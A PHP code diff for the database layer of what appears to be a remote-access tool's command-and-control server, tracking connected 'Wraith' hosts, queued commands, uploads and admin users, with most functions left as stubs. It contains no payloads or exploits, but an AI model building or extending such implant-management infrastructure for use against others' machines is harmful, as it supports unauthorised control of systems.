@@ -7,7 +7,7 @@ $DATABASE_LOCATION = "./storage/wraithdb";
 // This can be edited to use MySQL or equivalent databases. As long as
 // there is a $db variable holding a PDO database connection
 // all should work (untested).
-$db = new PDO("sqlite:" . $DATABASE_LOCATION);
+$GLOBALS["db"] = new PDO("sqlite:" . $DATABASE_LOCATION);
 $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
 
 // Check whether the database is initialised
@@ -23,28 +23,28 @@ try {
     $db_init_commands = [
         // Settings table
         "CREATE TABLE IF NOT EXISTS `WraithAPI_Settings` (
-            `WraithMarkOfflineDelaySeconds` INTEGER,
+            `WraithMarkOfflineDelaySeconds` TEXT,
             `WraithInitialCryptKey` TEXT,
             `WraithSwitchCryptKey` TEXT,
             `APIFingerprint` TEXT,
             `DefaultCommand` TEXT,
             `APIPrefix` TEXT,
             `RequestIPBlacklist` TEXT,
-            `NoEncrypt` INTEGER
+            `NoEncrypt` TEXT
         );",
         // Statistics table
         "CREATE TABLE IF NOT EXISTS `WraithAPI_Stats` (
-            `DatabaseSetupTime` INTEGER,
-            `LifetimeWraithConnections` INTEGER,
-            `CurrentActiveWraiths` INTEGER,
+            `DatabaseSetupTime` TEXT,
+            `LifetimeWraithConnections` TEXT,
+            `CurrentActiveWraiths` TEXT,
             `MostRecentWraithLogin` TEXT,
-            `WraithUploads` INTEGER,
-            `CommandsIssued` INTEGER,
-            `CommandsExecuted` INTEGER
+            `WraithUploads` TEXT,
+            `CommandsIssued` TEXT,
+            `CommandsExecuted` TEXT
         );",
         // Connected Wraiths table
         "CREATE TABLE IF NOT EXISTS `WraithAPI_ActiveWraiths` (
-            `AssignedID` TEXT NOT NULL UNIQUE,
+            `AssignedID` TEXT,
             `Fingerprint` TEXT,
             `ReportedIP` TEXT,
             `ConnectingIP` TEXT,
@@ -52,25 +52,26 @@ try {
             `SystemName` TEXT,
             `HostUserName` TEXT,
             `WraithVersion` TEXT,
-            `HeartbeatsReceived` INTEGER,
-            `LastHeartbeatTime` INTEGER NOT NULL,
+            `ActivePlugins` TEXT,
+            `ConnectionTime` TEXT,
+            `LastHeartbeatTime` TEXT,
             `IssuedCommands` TEXT
         );",
         // Command queue table
         "CREATE TABLE IF NOT EXISTS `WraithAPI_CommandsIssued` (
-            `CommandID` TEXT NOT NULL UNIQUE,
+            `CommandID` TEXT,
             `CommandName` TEXT,
             `CommandParams` TEXT,
             `CommandTargets` TEXT,
             `CommandResponses` TEXT,
-            `TimeIssued` INTEGER
+            `TimeIssued` TEXT
         );",
         // Users table
         "CREATE TABLE IF NOT EXISTS `WraithAPI_Users` (
             `UserID` INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT UNIQUE,
-            `UserName` TEXT NOT NULL UNIQUE,
+            `UserName` TEXT,
             `UserPassword` TEXT,
-            `UserPrivileges` INTEGER
+            `UserPrivileges` TEXT
         );",
         // Initialisation marker
         "CREATE TABLE IF NOT EXISTS `DB_INIT_INDICATOR` (
@@ -164,6 +165,8 @@ $API_USERS = $db->query("SELECT * FROM WraithAPI_Users LIMIT 1")->fetchAll();
 // Add a Wraith to the database
 function db_add_wraiths($data) {
 
+    global $db;
+
     $statement = $db->prepare("INSERT INTO `WraithAPI_ActiveWraiths` (
         `AssignedID`,
         `Fingerprint`,
@@ -173,7 +176,8 @@ function db_add_wraiths($data) {
         `SystemName`,
         `HostUserName`,
         `WraithVersion`,
-        `HeartbeatsReceived`,
+        `ActivePlugins`,
+        `ConnectionTime`,
         `LastHeartbeatTime`,
         `IssuedCommands`
     ) VALUES (
@@ -185,24 +189,38 @@ function db_add_wraiths($data) {
         :SystemName,
         :HostUserName,
         :WraithVersion,
+        :ActivePlugins,
+        :ConnectionTime,
         :LastHeartbeatTime,
         :IssuedCommands
     )");
 
-
-    $statement->bindParam(':AssignedID', $name);
-
     foreach ($data as $wraith) {
 
-        $db->exec($command);
+        $statement->bindParam(":AssignedID", $wraith["AssignedID"]);
+        $statement->bindParam(":Fingerprint", $wraith["Fingerprint"]);
+        $statement->bindParam(":ReportedIP", $wraith["ReportedIP"]);
+        $statement->bindParam(":ConnectingIP", $wraith["ConnectingIP"]);
+        $statement->bindParam(":OSType", $wraith["OSType"]);
+        $statement->bindParam(":SystemName", $wraith["SystemName"]);
+        $statement->bindParam(":HostUserName", $wraith["HostUserName"]);
+        $statement->bindParam(":WraithVersion", $wraith["WraithVersion"]);
+        $statement->bindParam(":ActivePlugins", $wraith["ActivePlugins"]);
+        $statement->bindParam(":ConnectionTime", $wraith["ConnectionTime"]);
+        $statement->bindParam(":LastHeartbeatTime", $wraith["LastHeartbeatTime"]);
+        $statement->bindParam(":IssuedCommands", $wraith["IssuedCommands"]);
+
+        // Execute the statement to add a Wraith
+        $statement->execute();
 
     }
-
 
 }
 
 // Remove a Wraith
 function db_remove_wraiths($filters) {
+
+    global $db;
 
     // TODO
 
@@ -212,12 +230,16 @@ function db_remove_wraiths($filters) {
 // them from the database
 function db_expire_wraiths() {
 
+    global $db;
+
     // TODO
 
 }
 
 // Get a list of Wraiths and their properties
 function db_get_wraiths($filters) {
+
+    global $db;
 
     // TODO
 
@@ -228,6 +250,8 @@ function db_get_wraiths($filters) {
 // Issue a command to Wraith(s)
 function db_issue_commands($data) {
 
+    global $db;
+
     // TODO
 
 }
@@ -235,12 +259,16 @@ function db_issue_commands($data) {
 // Delete a command from the command table
 function db_cancel_commands($filters) {
 
+    global $db;
+
     // TODO
 
 }
 
 // Get commands (all or filtered)
 function db_get_commands($filters) {
+
+    global $db;
 
     // TODO
 
@@ -251,12 +279,16 @@ function db_get_commands($filters) {
 // Edit an API setting
 function db_edit_settings($data) {
 
+    global $db;
+
     // TODO
 
 }
 
 // Create a new user
 function db_add_users($data) {
+
+    global $db;
 
     // TODO
 
@@ -265,6 +297,8 @@ function db_add_users($data) {
 // Change username
 function db_change_user_name($data) {
 
+    global $db;
+
     // TODO
 
 }
@@ -272,12 +306,16 @@ function db_change_user_name($data) {
 // Change user password
 function db_change_user_pass($data) {
 
+    global $db;
+
     // TODO
 
 }
 
 // Change user privilege level (0=User, 1=Admin, 2=SuperAdmin)
 function db_change_user_privilege($data) {
+
+    global $db;
 
     // TODO
 
@@ -287,6 +325,8 @@ function db_change_user_privilege($data) {
 
 // Update a statistic
 function db_update_stats($data) {
+
+    global $db;
 
     // TODO
 
